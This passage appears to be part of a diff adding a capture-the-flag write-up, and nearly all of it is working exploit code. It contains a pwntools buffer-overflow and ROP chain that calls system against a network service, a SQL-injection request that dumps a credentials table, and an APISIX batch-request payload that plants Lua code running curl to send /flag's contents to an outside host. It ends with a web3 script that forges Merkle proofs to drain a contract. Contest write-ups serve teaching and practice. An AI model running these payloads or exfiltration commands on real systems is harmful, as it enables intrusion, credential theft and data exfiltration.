+            <span class="hljs-built_in">handleInfo</span>(<span class="hljs-number">0</span>x448+<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(negotiate_addr)+<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x448+<span class="hljs-built_in">len</span>(negotiate_addr)+<span class="hljs-number">1</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x408+canary+b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x38+negotiate_addr+<span class="hljs-built_in">p8</span>(j))
+        try:
+            r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;NBDMAGICIHAVEOPT&#x27;</span>)
+            if <span class="hljs-built_in">len</span>(negotiate_addr)==<span class="hljs-number">1</span>:
+                negotiate_addr+=<span class="hljs-built_in">p8</span>(j|((negotiate_offset&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0</span>xf))
+            else:
+                negotiate_addr+=<span class="hljs-built_in">p8</span>(j)
+            <span class="hljs-built_in">print</span>(negotiate_addr)
+            r.<span class="hljs-built_in">close</span>()
+            break
+        except:
+            r.<span class="hljs-built_in">close</span>()
+negotiate_addr+=b<span class="hljs-string">&#x27;\x00\x00&#x27;</span>
+code_base = <span class="hljs-built_in">u64</span>(negotiate_addr)-negotiate_offset
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(code_base))
+
+r = <span class="hljs-built_in">remote</span>(IP,port)
+r.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&#x27;NBDMAGICIHAVEOPT\x00\x03&#x27;</span>) #INIT_PASSWD + opts_magic + smallflags
+r.<span class="hljs-built_in">send</span>(b<span class="hljs-string">&#x27;\x00\x00\x00\x03&#x27;</span>) #<span class="hljs-built_in">cflags</span>(NEWSTYLE|NO_ZEROES) + opts_magic
+ROPchain = <span class="hljs-built_in">p64</span>(code_base+C_set_param)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">1</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">4</span>)+<span class="hljs-built_in">p64</span>(code_base+bss_offset)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">22</span>)+<span class="hljs-built_in">p64</span>(code_base+read_got_offset)+\
+           <span class="hljs-built_in">p64</span>(code_base+C_call_func)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+\
+           <span class="hljs-built_in">p64</span>(code_base+C_pop_rdi)+<span class="hljs-built_in">p64</span>(code_base+bss_offset)+\
+           <span class="hljs-built_in">p64</span>(code_base+system_plt_offset)
+<span class="hljs-built_in">handleInfo</span>(<span class="hljs-number">0</span>x448+<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(ROPchain),<span class="hljs-number">0</span>x448+<span class="hljs-built_in">len</span>(ROPchain),b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x408+canary+b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x38+ROPchain)
+r.<span class="hljs-built_in">send</span>(b<span class="hljs-string">&#x27;cat /mnt/flag.txt &gt;&amp;4\x00&#x27;</span>)
+<span class="hljs-built_in">print</span>(r.<span class="hljs-built_in">recvall</span>())
+r.<span class="hljs-built_in">interactive</span>()</code></pre><h2 id="web"><a class="header-link" href="#web"></a>web</h2>
+<h3 id="hack-into-skynet"><a class="header-link" href="#hack-into-skynet"></a>hack into skynet</h3>
+<pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.242.21.212:8081
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>247
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryKhkYDh3tENxA2icS
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SessionId=e8b7fdceddfac5aa6f84044abd832f87
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+
+<span class="ada"><span class="hljs-comment">------WebKitFormBoundaryKhkYDh3tENxA2icS</span>
+Content-Disposition: form-data; name=<span class="hljs-string">&quot;name&quot;</span>
+
+<span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> access_key,password||<span class="hljs-string">&#x27;:&#x27;</span>||secret_key||<span class="hljs-string">&#x27;:&#x27;</span>||password from target_credentials limit <span class="hljs-number">1</span> offset <span class="hljs-number">6</span>
+<span class="hljs-comment">-- -</span>
+<span class="hljs-comment">------WebKitFormBoundaryKhkYDh3tENxA2icS--</span></span></code></pre><p>=&gt; <code>rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}</code></p>
+<h3 id="api6"><a class="header-link" href="#api6"></a>API6</h3>
+<pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/apisix/batch-requests</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:9080
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>526
+
+<span class="swift">{
+    <span class="hljs-string">&quot;headers&quot;</span>: {
+        <span class="hljs-string">&quot;X-API-KEY&quot;</span>:<span class="hljs-string">&quot;edd1c9f034335f136f87ad84b625c8f1&quot;</span>,
+        <span class="hljs-string">&quot;X-Real-IP&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>
+    },
+    <span class="hljs-string">&quot;timeout&quot;</span>: <span class="hljs-number">500</span>,
+    <span class="hljs-string">&quot;pipeline&quot;</span>: [
+        {
+            <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;PUT&quot;</span>,
+            <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/apisix/admin/routes/1&quot;</span>,
+            <span class="hljs-string">&quot;headers&quot;</span>: {
+                <span class="hljs-string">&quot;X-Real-IP&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>
+            },
+            <span class="hljs-string">&quot;body&quot;</span>:<span class="hljs-string">&quot;{
+                <span class="hljs-subst">\&quot;</span>uri<span class="hljs-subst">\&quot;</span>: <span class="hljs-subst">\&quot;</span>/rce<span class="hljs-subst">\&quot;</span>,
+                <span class="hljs-subst">\&quot;</span>script<span class="hljs-subst">\&quot;</span>: <span class="hljs-subst">\&quot;</span>local _M = {} <span class="hljs-subst">\n</span> function _M.access(api_ctx) <span class="hljs-subst">\n</span> os.execute(&#x27;curl ginoah.tw?p=`cat /flag`&#x27;)<span class="hljs-subst">\n</span> end <span class="hljs-subst">\n</span>return _M<span class="hljs-subst">\&quot;</span>
+            }&quot;</span>
+        }
+    ]
+}</span></code></pre><p>Then trigger the script</p>
+<pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/rce</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:9080
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close</code></pre><p>=&gt;<code>rwctf{1998e51bd0dd6ba945d0676d45d32852}</code></p>
+<h2 id="cryptocurrency"><a class="header-link" href="#cryptocurrency"></a>crypto(currency)</h2>
+<h3 id="tresure-hunter"><a class="header-link" href="#tresure-hunter"></a>Tresure Hunter</h3>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> subprocess
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3
+<span class="hljs-keyword">from</span> eth_account <span class="hljs-keyword">import</span> Account
+<span class="hljs-keyword">from</span> ethereum.transactions <span class="hljs-keyword">import</span> Transaction
+<span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">import</span> sha3
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-comment">###Util</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leafHash</span>(<span class="hljs-params">address,val</span>):</span>
+    <span class="hljs-keyword">if</span> val==<span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">32</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> sha3.keccak_256(long_to_bytes(<span class="hljs-built_in">int</span>(address[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)).rjust(<span class="hljs-number">32</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+long_to_bytes(val).rjust(<span class="hljs-number">32</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)).digest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">merge</span>(<span class="hljs-params">l,r</span>):</span>
+    <span class="hljs-keyword">if</span> l==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> r==<span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">32</span>
+    <span class="hljs-keyword">elif</span> l==<span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> r
+    <span class="hljs-keyword">elif</span> r==<span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> l
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> sha3.keccak_256(l+r).digest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calcRoot</span>(<span class="hljs-params">proof,leaves</span>):</span>
+    idx = <span class="hljs-number">0</span>
+    cur = <span class="hljs-number">0</span>
+    stack = []
+    L = <span class="hljs-built_in">len</span>(proof)
+    hist = []
+    <span class="hljs-keyword">while</span> idx&lt;L:
+        <span class="hljs-keyword">if</span> proof[idx]==<span class="hljs-number">0x4c</span>:
+            stack.append((leaves[cur][<span class="hljs-number">0</span>],leafHash(leaves[cur][<span class="hljs-number">0</span>],leaves[cur][<span class="hljs-number">1</span>])))
+            cur+=<span class="hljs-number">1</span>
+            idx+=<span class="hljs-number">1</span>
+        <span class="hljs-keyword">elif</span> proof[idx]==<span class="hljs-number">0x48</span>:
+            <span class="hljs-keyword">if</span> L&lt;<span class="hljs-number">2</span>:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack underflow&#x27;</span>)
+                exit()
+            <span class="hljs-keyword">if</span> idx&gt;=L-<span class="hljs-number">1</span>:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;instruction overflow&#x27;</span>)
+                exit()
+            height = proof[idx+<span class="hljs-number">1</span>]
+            N1 = stack[-<span class="hljs-number">1</span>]
+            N2 = stack[-<span class="hljs-number">2</span>]
+            stack = stack[:-<span class="hljs-number">2</span>]
+            N1_A = <span class="hljs-built_in">int</span>(N1[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)
+            N2_A = <span class="hljs-built_in">int</span>(N2[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)
+            <span class="hljs-keyword">if</span> (N1_A&gt;&gt;(height+<span class="hljs-number">1</span>))!=(N2_A&gt;&gt;(height+<span class="hljs-number">1</span>)):
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;path mismatch&#x27;</span>)
+                exit()
+            <span class="hljs-keyword">if</span> ((N1_A&gt;&gt;height)&amp;<span class="hljs-number">1</span>)==((N2_A&gt;&gt;height)&amp;<span class="hljs-number">1</span>):
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;incorrect height&#x27;</span>,N1[<span class="hljs-number">0</span>],N2[<span class="hljs-number">0</span>],height)
+                exit()
+            <span class="hljs-keyword">if</span> ((N1_A&gt;&gt;height)&amp;<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:
+                N = (N2[<span class="hljs-number">0</span>],merge(N1[<span class="hljs-number">1</span>],N2[<span class="hljs-number">1</span>]))
+            <span class="hljs-keyword">else</span>:
+                N = (N2[<span class="hljs-number">0</span>],merge(N2[<span class="hljs-number">1</span>],N1[<span class="hljs-number">1</span>]))
+            idx+=<span class="hljs-number">2</span>
+            stack.append(N)
+        <span class="hljs-keyword">elif</span> proof[idx]==<span class="hljs-number">0x50</span>:
+            <span class="hljs-keyword">if</span> L&lt;<span class="hljs-number">1</span>:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack underflow&#x27;</span>)
+                exit()
+            <span class="hljs-keyword">if</span> idx&gt;=L-<span class="hljs-number">2</span>:
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;instruction overflow&#x27;</span>)
+                exit()
+            height = proof[idx+<span class="hljs-number">1</span>]
+            N1 = stack[-<span class="hljs-number">1</span>]
+            stack = stack[:-<span class="hljs-number">1</span>]
+            N1_A = <span class="hljs-built_in">int</span>(N1[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)
+            <span class="hljs-keyword">if</span> ((N1_A&gt;&gt;height)&amp;<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:
+                N = (<span class="hljs-string">&#x27;0x&#x27;</span>+<span class="hljs-built_in">hex</span>((N1_A&gt;&gt;(height+<span class="hljs-number">1</span>))&lt;&lt;(height+<span class="hljs-number">1</span>))[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;0&#x27;</span>),merge(N1[<span class="hljs-number">1</span>],proof[idx+<span class="hljs-number">2</span>]))
+            <span class="hljs-keyword">else</span>:
+                N = (<span class="hljs-string">&#x27;0x&#x27;</span>+<span class="hljs-built_in">hex</span>((N1_A&gt;&gt;(height+<span class="hljs-number">1</span>))&lt;&lt;(height+<span class="hljs-number">1</span>))[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;0&#x27;</span>),merge(proof[idx+<span class="hljs-number">2</span>],N1[<span class="hljs-number">1</span>]))
+            idx+=<span class="hljs-number">3</span>
+            stack.append(N)
+        hist.append(stack)
+    <span class="hljs-keyword">return</span> hist
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encodeProof</span>(<span class="hljs-params">proof</span>):</span>
+    enc = []
+    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> proof:
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(x)==<span class="hljs-built_in">int</span>:
+            x = long_to_bytes(x).rjust(<span class="hljs-number">32</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)
+        enc.append(x)
+    <span class="hljs-keyword">return</span> enc
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createAccount</span>():</span>
+    account = web3.eth.account.create()
+    res = requests.post(<span class="hljs-string">f&#x27;http://<span class="hljs-subst">{ip}</span>:<span class="hljs-subst">{Fport}</span>/api/claim&#x27;</span>,data={<span class="hljs-string">&#x27;address&#x27;</span>:account.address})
+    <span class="hljs-keyword">return</span> account
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wait</span>(<span class="hljs-params">txhash</span>):</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-keyword">try</span>:
+            rcpt = web3.eth.getTransactionReceipt(txhash)
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">except</span>:
+            time.sleep(<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">return</span> rcpt
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">accountA,accountB,target</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug0</span>(<span class="hljs-params">rcpt</span>):</span>
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;status :&#x27;</span>,rcpt.status)
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug1</span>(<span class="hljs-params">web3, contract_addr</span>):</span>
+        event_filter = web3.eth.<span class="hljs-built_in">filter</span>({<span class="hljs-string">&#x27;address&#x27;</span>:contract_addr})
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;events : &#x27;</span>)
+        <span class="hljs-keyword">for</span> Filter <span class="hljs-keyword">in</span> event_filter.get_all_entries():
+            <span class="hljs-built_in">print</span>(Filter[<span class="hljs-string">&#x27;data&#x27;</span>])
+    hunters = [(<span class="hljs-string">&#x27;0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e&#x27;</span>,<span class="hljs-number">1</span>),
+               (<span class="hljs-string">&#x27;0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45&#x27;</span>,<span class="hljs-number">1</span>),
+               (<span class="hljs-string">&#x27;0x6B175474E89094C44Da98b954EedeAC495271d0F&#x27;</span>,<span class="hljs-number">1</span>),
+               (<span class="hljs-string">&#x27;0x6B3595068778DD592e39A122f4f5a5cF09C90fE2&#x27;</span>,<span class="hljs-number">1</span>),
+               (<span class="hljs-string">&#x27;0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B&#x27;</span>,<span class="hljs-number">1</span>),
+               (<span class="hljs-string">&#x27;0xc00e94Cb662C3520282E6f5717214004A7f26888&#x27;</span>,<span class="hljs-number">1</span>),
+               (<span class="hljs-string">&#x27;0xD533a949740bb3306d119CC777fa900bA034cd52&#x27;</span>,<span class="hljs-number">1</span>),
+               (<span class="hljs-string">&#x27;0xdAC17F958D2ee523a2206206994597C13D831ec7&#x27;</span>,<span class="hljs-number">1</span>)]
+    proof = [<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x9f</span>]
+    abi = [{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;enter&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;_proofs&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bytes32[]&#x27;</span>}],<span class="hljs-string">&#x27;outputs&#x27;</span>:[],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;leave&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;_proofs&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bytes32[]&#x27;</span>}],<span class="hljs-string">&#x27;outputs&#x27;</span>:[],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;findKey&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;_proofs&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bytes32[]&#x27;</span>}],<span class="hljs-string">&#x27;outputs&#x27;</span>:[],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;pickupTreasureChest&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;_proofs&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bytes32[]&#x27;</span>}],<span class="hljs-string">&#x27;outputs&#x27;</span>:[],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;openTreasureChest&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[],<span class="hljs-string">&#x27;outputs&#x27;</span>:[],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[],<span class="hljs-string">&#x27;outputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bytes32&#x27;</span>}],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;smtMode&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[],<span class="hljs-string">&#x27;outputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;smtMode&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bytes32&#x27;</span>}],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;haveKey&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;address&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;address&#x27;</span>}],<span class="hljs-string">&#x27;outputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;state&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bool&#x27;</span>}],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>},
+           {<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;haveTreasureChest&#x27;</span>,<span class="hljs-string">&#x27;constant&#x27;</span>:<span class="hljs-literal">True</span>,<span class="hljs-string">&#x27;inputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;address&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;address&#x27;</span>}],<span class="hljs-string">&#x27;outputs&#x27;</span>:[{<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;state&#x27;</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;bool&#x27;</span>}],<span class="hljs-string">&#x27;payable&#x27;</span>:<span class="hljs-literal">False</span>,<span class="hljs-string">&#x27;type&#x27;</span>:<span class="hljs-string">&#x27;function&#x27;</span>}]
+    contract = web3.eth.contract(address=target,abi=abi)
+
+    hist = calcRoot(proof,hunters)
+    keyState = hist[-<span class="hljs-number">2</span>]
+    proof = [<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">2</span>,keyState[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],<span class="hljs-number">0x50</span>,<span class="hljs-number">1</span>,keyState[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]]
+    pe = encodeProof(proof)
+
+    tx = contract.functions.enter(pe).buildTransaction({<span class="hljs-string">&#x27;from&#x27;</span>:accountA.address})
+    tx[<span class="hljs-string">&#x27;nonce&#x27;</span>] = web3.eth.get_transaction_count(accountA.address)
+    tx = web3.eth.account.sign_transaction(tx,accountA.key)
+    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
+    rcpt = wait(txhash)
+    <span class="hljs-built_in">print</span>(rcpt)
+
+    tx = contract.functions.pickupTreasureChest(pe).buildTransaction({<span class="hljs-string">&#x27;from&#x27;</span>:accountA.address})
+    tx[<span class="hljs-string">&#x27;nonce&#x27;</span>] = web3.eth.get_transaction_count(accountA.address)
+    tx = web3.eth.account.sign_transaction(tx,accountA.key)
+    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
+    rcpt = wait(txhash)
+    <span class="hljs-built_in">print</span>(rcpt)
+
+    hist = calcRoot(proof,[(accountA.address,<span class="hljs-number">1</span>)])
+    nkeyState = hist[-<span class="hljs-number">2</span>]
+    proof = [<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x9e</span>,keyState[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],<span class="hljs-number">0x50</span>,<span class="hljs-number">0x9f</span>,nkeyState[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]]
+    pe = encodeProof(proof)
+
+    tx = contract.functions.enter(pe).buildTransaction({<span class="hljs-string">&#x27;from&#x27;</span>:accountB.address})
+    tx[<span class="hljs-string">&#x27;nonce&#x27;</span>] = web3.eth.get_transaction_count(accountB.address)
+    tx = web3.eth.account.sign_transaction(tx,accountB.key)
+    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
+    rcpt = wait(txhash)
+    <span class="hljs-built_in">print</span>(rcpt)
+
+    tx = contract.functions.leave(pe).buildTransaction({<span class="hljs-string">&#x27;from&#x27;</span>:accountB.address})
+    tx[<span class="hljs-string">&#x27;nonce&#x27;</span>] = web3.eth.get_transaction_count(accountB.address)
+    tx = web3.eth.account.sign_transaction(tx,accountB.key)
+    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
+    rcpt = wait(txhash)
+    <span class="hljs-built_in">print</span>(rcpt)
+
+    tx = contract.functions.findKey(pe).buildTransaction({<span class="hljs-string">&#x27;from&#x27;</span>:accountA.address})
+    tx[<span class="hljs-string">&#x27;nonce&#x27;</span>] = web3.eth.get_transaction_count(accountA.address)
+    tx = web3.eth.account.sign_transaction(tx,accountA.key)
+    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
+    rcpt = wait(txhash)
+    <span class="hljs-built_in">print</span>(rcpt)
+
+    <span class="hljs-built_in">print</span>(contract.functions.haveKey(accountA.address).call({<span class="hljs-string">&#x27;from&#x27;</span>:accountA.address}))
+    <span class="hljs-built_in">print</span>(contract.functions.haveTreasureChest(accountA.address).call({<span class="hljs-string">&#x27;from&#x27;</span>:accountA.address}))
+
+    tx = contract.functions.openTreasureChest().buildTransaction({<span class="hljs-string">&#x27;from&#x27;</span>:accountA.address})
+    tx[<span class="hljs-string">&#x27;nonce&#x27;</span>] = web3.eth.get_transaction_count(accountA.address)
+    tx = web3.eth.account.sign_transaction(tx,accountA.key)
+    txhash = web3.eth.sendRawTransaction(tx.rawTransaction)
+    rcpt = wait(txhash)
+    <span class="hljs-built_in">print</span>(rcpt)
+
+<span class="hljs-comment">###Exploit</span>
